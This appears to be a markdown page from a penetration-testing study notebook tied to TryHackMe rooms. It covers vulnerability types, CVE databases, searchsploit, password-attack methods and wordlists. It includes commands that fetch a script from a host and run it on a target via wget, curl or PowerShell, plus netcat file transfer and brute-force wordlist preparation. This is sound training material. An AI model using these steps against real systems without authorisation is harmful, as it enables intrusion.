# Exploitation

[![vulnerabilities101](../../_badges/thm/vulnerabilities101.svg)](https://tryhackme.com/room/vulnerabilities101)
[![exploitingavulnerabilityv2](../../_badges/thmp/exploitingavulnerabilityv2.svg)](https://tryhackme.com/room/exploitingavulnerabilityv2)
[![vulnerabilitycapstone](../../_badges/thmp/vulnerabilitycapstone.svg)](https://tryhackme.com/room/vulnerabilitycapstone)
[![attackerkb](../../_badges/thm/attackerkb.svg)](https://tryhackme.com/room/attackerkb)

<div class="row row-cols-md-2"><div>

The first two steps were investigation and Discovery, in which the hacker will find attack vectors, and information that will increase the probability of the attack succeeding, such as a username that could be used to brute force a service.

The third step is about exploitation, meaning trying to find a weakness/vulnerability/flaw in the target that could be **exploited** to execute the attack.
</div><div>

* Try to find vulnerabilities in running services üéØ

* Try to brute force credentials on running services üîè

* Try to exploit the website üïµÔ∏è

* Try to exploit the API üëì

* Try to exploit the database üíæ
</div></div>

<hr class="sep-both">

### Vulnerabilities üí∞

<div class="row row-cols-md-2"><div>

There are 5 main categories of vulnerabilities

* Those of the **Operating System**
* Those based on a **(Mis)Configuration**
  * Ex: Version Disclosure
  * Ex: Sensitive Data Exposure <small>(exposing database source code...)</small>
  * Ex: Security Misconfigurations such as cryptographic ones
* Those because of **weak/default credentials**
* Those because of a **logic flaw** in the application
  * Ex: Insecure Deserialization
* Those because of a **Human-Factor**
</div><div>

Which may lead to attacks such as

* Brute force credentials
* Remote code execution (RCE)
* ...

Note that not all vulnerabilities are exploitable, and not all vulnerabilities have a public exploit to exploit them.
</div></div>

<hr class="sep-both">

## Vulnerabilities systems

There are 2 well-known systems to rank vulnerabilities.

<div class="row row-cols-md-2"><div>

**Common Vulnerability Scoring System** <small>(CVSS, 2005, free+opens-source)</small>. It's based on things like ease of use, reproducibility, the existence of exploits, the impact on the CIA triad... See [the CVSS calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator).
</div><div>

**Vulnerability Priority Rating** <small>(VPR)</small>. It's a modern way that is based on the risks that a vulnerability has on an organization.
</div></div>

<hr class="sep-both">

## Vulnerabilities (CVE) databases

Vulnerabilities are named following the **Common Vulnerabilities and Exposures**, mostly known as **CVE**, which is **CVE-YEAR-ID**. There are way too many websites to look for CVEs. I added an arrow (‚û°Ô∏è) to those that you will most likely use on a daily basis.

<div class="row row-cols-md-2"><div>

**General websites**

* ‚û°Ô∏è [exploit-db.com](https://www.exploit-db.com/), and the command [searchsploit](https://github.com/offensive-security/exploitdb) (7.5k ‚≠ê). Useful to find exploits, and test them.

```bash
$ searchsploit WordPress wpDiscuz
[...]
WordPress Plugin wpDiscuz 7.0.4 - Remote C | php/webapps/49967.py
[...]
$ searchsploit -p 49967
[...]
Path: /usr/share/exploitdb/exploits/php/webapps/49967.py
[...]
$ cp /usr/share/exploitdb/exploits/php/webapps/49967.py /tmp/49967.py
$ # edit the exploit, and try to use it
```

* [nvd.nist.gov](https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&search_type=all) / [full listing](https://nvd.nist.gov/vuln/full-listing): a reference üìå

* ‚û°Ô∏è [attackerkb.com](https://attackerkb.com/): community reviews on CVEs. There is a tool similar to searchsploit [akb-explorer](https://github.com/horshark/akb-explorer) (33‚≠ê).

* [vulners](https://vulners.com/) (ex: [CVE-2016-1531](https://vulners.com/cve/CVE-2016-1531))) is a big search engines for vulnerabilities.

* [cvelist](https://github.com/CVEProject/cvelist): big Git with every CVE

* [inthewild](https://inthewild.io/) ([GitHub](https://github.com/gmatuz/inthewilddb))

</div><div>

* ‚û°Ô∏è[CVE details](https://www.cvedetails.com/): interface easy to use

* [cve.circl.lu](https://cve.circl.lu/): quite readable, as they get to the point, with a readable interface

* [cve.mitre.org](https://cve.mitre.org/cve/), and their new website: [cve.org](https://www.cve.org/). This is basically a big list of CVEs, regardless of whether them being exploitable, or not.

* [security.snyk.io](https://security.snyk.io/): the interface is nicer,  through it's not as generic / covering as much CVEs as others.

* [rapid7.com](https://www.rapid7.com/db/): they give you ways to exploit CVE sometimes, such as the name of the Metasploit module...

<br>

**Specific to a product/platform**

* [microsoft.com](https://msrc.microsoft.com/update-guide/) (example: [CVE-2019-1388](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388)): for Microsoft CVEs

<br>

**Other**

* ‚û°Ô∏è&nbsp; it's very useful to look for exploits/vulnerabilities on Google and GitHub. They are often **PoC** (Proof Of Concept) showing how to exploit a vulnerability. 
* ‚û°Ô∏è&nbsp; There is this repository: [cve](https://github.com/trickest/cve) (3.8k ‚≠ê) which aims to gather every CVE and their PoC.
</div></div>

<hr class="sep-both">

## Transfer files between two machinesüõÖ

You will often have to send scripts to the target, or download files from the target.

<div class="row row-cols-md-2"><div>

**The most used: Python HTTP Server** üêç

<i class="small">On the host where the file is:</i>

```bash
$ ls
file.sh file.ps1
$ python -m http.server port # port > 1023
$ sudo python -m http.server port # port <= 1023
```

<i class="small">On the client that need the file:</i>

```bash
# Linux
$ wget HOST_IP:port/script.sh -o /tmp/script.sh
$ chmod +x /tmp/script.sh;
$ /tmp/script.sh
# Windows
PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> . $Env:TMP/script.ps1; script
```
</div><div>

Of course, it doesn't work in every case.

* You may use copy-paste if available ‚úÇÔ∏è
* You may try with `python2`, and `python3`
* You may have to use `curl` or `iws` (Windows-only)

```bash
$ curl HOST_IP:port/script.sh -o /tmp/script.sh
PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

* You can use netcat üåâ

```bash
# host
$ nc CLIENT_IP port < file.sh
# client
$ nc -lvp port > file.sh
```

* You may use FTP/SCP/NFS... if applicable
</div></div>

<hr class="sep-both">

## Password attacks üîê

<div class="row row-cols-md-2"><div>

There are 3 usual ways of carrying a password attack

* **Password Guessing**: based on knowledge of the target (birth year...)
* **Dictionary Attack**: test a list in which there may be the password
* **Brute Force Attack**: try every possibility (ex: incremental ASCII)
</div><div>

There are a few mitigations

* Block an IP after $n$ failed attempts within $x$ seconds

* Use a strong password policy

* Delay authentication attempts (throttle) to slow down attacks

* Use a CAPTCHA while taking into account that they are services to "bypass" them

* Use two-Factor authentication

</div></div>

<hr class="sl">

## üìÉ Wordlists üìÉ

<div class="row row-cols-md-2 mt-3"><div>

There are two packages that are providing a lot of wordlists. Install, then use either command `wordlists` or `seclists` to move to the location where the wordlists are stored, and get the path of every wordlist.

* package seclists | [GitHub](https://github.com/danielmiessler/SecLists) (43k ‚≠ê)
* package wordlists | [GitHub](https://github.com/drtychai/wordlists) (0.1k ‚≠ê)

> **CTF are usually using `/usr/share/wordlists/rockyou.txt`** when there is a password to crack. If it's not inside, then it's likely that you're not supposed to use brute force.

### ‚û°Ô∏è Improving efficiency

As a "hacker", if there is a policy of "at least n characters/up to $m$ characters", then it would be very wise to filter shorter/longer values from your wordlists. For instance, with `rockyou.txt`

* `{n}`: only keep values having exactly $n$ characters
* `{n,}`: only keep values having more ($\ge$) than $n$ characters
* `{n,m}`: only keep values having between $[n,m]$ characters
* `{,m}`: only keep values having less ($\le$) than $m$ characters

```bash
# only keep 4 letters passwords
$ egrep '^.{4}$' /usr/share/wordlists/rockyou.txt > /tmp/4rock.lst
# which is the same as
$ grep '^....$' /usr/share/wordlists/rockyou.txt > /tmp/4rock.lst
```

As a reminder, you can also merge wordlists

```bash
$ cat wordlist1 wordlist2 wordlist3 > wordlist123
```
</div><div>

### ‚û°Ô∏è generate simple wordlists

There may be a case in which you want a wordlist such as numbers from 0 to 99, or every letter from A to Z. In both cases, I'm using [bash braces expansion](/operating-systems/linux/bash/index.md#braces-expansion) to generate the wordlist like this

```bash
$ echo {A..Z} | tr ' ' '\n' > AZ.lst
$ echo {0..99} | tr ' ' '\n' > 0_to_99.lst
$ echo user{0..9} | tr ' ' '\n' > user_0_to_99.lst
$ echo {admin,adm,user} | tr ' ' '\n' > simple_list.lst
```

### ‚û°Ô∏è package wordlist

<p class="mt-4">Passwords</p>

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/dirb/others/best1050.txt
/usr/share/wordlists/dirb/others/best110.txt
/usr/share/wordlists/dirb/others/best15.txt
```

### ‚û°Ô∏è package seclists üìå

<p class="mt-4">

[Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
</p>

```
$ ls /usr/share/seclists/Passwords/
2020-200_most_used_passwords.txt
darkc0de.txt
darkweb2017-top10000.txt
$ ls /usr/share/seclists/Passwords/Common-Credentials
10k-most-common.txt
10-million-password-list-top-1000000.txt
$ ls /usr/share/seclists/Usernames/
xato-net-10-million-usernames.txt
```

[Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames)

```
$ ls /usr/share/seclists/Usernames/
xato-net-10-million-usernames.txt
```
</div></div>